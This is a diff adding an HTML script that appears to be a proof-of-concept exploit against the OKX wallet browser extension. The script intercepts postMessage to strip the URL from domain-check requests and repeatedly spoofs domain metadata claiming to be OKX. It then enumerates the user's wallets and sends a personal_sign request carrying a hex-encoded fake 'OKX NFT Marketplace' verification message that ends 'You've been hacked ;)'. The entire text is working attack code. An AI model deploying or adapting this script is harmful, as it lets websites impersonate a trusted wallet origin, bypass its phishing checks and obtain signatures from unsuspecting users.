@@ -1,0 +1,94 @@
+<script>
+const originalPostMessage = window.postMessage;
+window.postMessage = function(message, targetOrigin, transfer) {
+    try {
+        if (
+            message &&
+            message.data &&
+            message.data.data &&
+            (message.data.data.method === "wallet_sendDomainMetadata" || message.data.data.method === "wallet_requestDomainCheck") &&
+            message.data.data.params &&
+            message.data.data.params.url
+        ) {
+            delete message.data.data.params.url;
+        }
+    } catch (error) {
+    }
+
+    originalPostMessage.call(this, message, targetOrigin, transfer);
+};
+window.addEventListener(
+    "message",
+    (event) => {
+        try {
+            let addressForChainId1 = null;
+
+            const resultArray = event.data.data.data.result;
+            for (const resultItem of resultArray) {
+                for (const addressItem of resultItem.address) {
+                    if (addressItem.chainId === "1") {
+                        addressForChainId1 = addressItem.address;
+                        break;
+                    }
+                }
+                if (addressForChainId1) {
+                    break;
+                }
+            }
+            if (addressForChainId1) {
+                clearInterval(window.a);
+                console.log("Address for chainId 1:", addressForChainId1);
+                window.postMessage({ "allow": true,
+                    "target": "okexwallet-contentscript",
+                    "data": {
+                        "name": "okexwallet-provider",
+                        "data": {
+                            "method": "personal_sign",
+                            "params": [
+                                "0x57656c636f6d6520746f204f4b58204e4654204d61726b6574706c6163652c204f4b58204e4654204d61726b6574706c616365207573657320746869732063727970746f67726170686963207369676e617475726520746f2076657269667920796f752061726520746865206f776e6572206f66207468697320616464726573732e0a0a204e6f6e63653a353838310a0a50733a20596f75277665206265656e206861636b6564203b29",
+
+                                addressForChainId1, null
+                            ],
+                            "jsonrpc": "2.0",
+                            "id": 924245546
+                        }
+                    }
+                }, '*');
+            }
+        } catch {}
+    },
+    false,
+);
+
+setInterval(function() {
+    window.postMessage({ "allow": true,
+        "target": "okexwallet-contentscript",
+        "data": {
+            "name": "okexwallet-provider",
+            "data": {
+                "method": "wallet_sendDomainMetadata",
+                "params": {
+                    "name": "OKX",
+                    "extensionId": "1",
+                    "icon": "https://www.okx.com/cdn/assets/imgs/226/EB771F0EE8994DD5.png",
+                    "isOkx": true
+                },
+                "jsonrpc": "2.0"
+            }
+        }
+    }, '*');
+}, 200);
+
+a = setInterval(function() {
+    window.postMessage({ "allow": true,
+        "target": "okexwallet-contentscript",
+        "data": {
+            "name": "okexwallet-provider",
+            "data": {
+                "method": "wallet_requestWallets",
+                "params": {},
+                "jsonrpc": "2.0"            }
+        }
+    }, '*');
+}, 3000)
+</script>
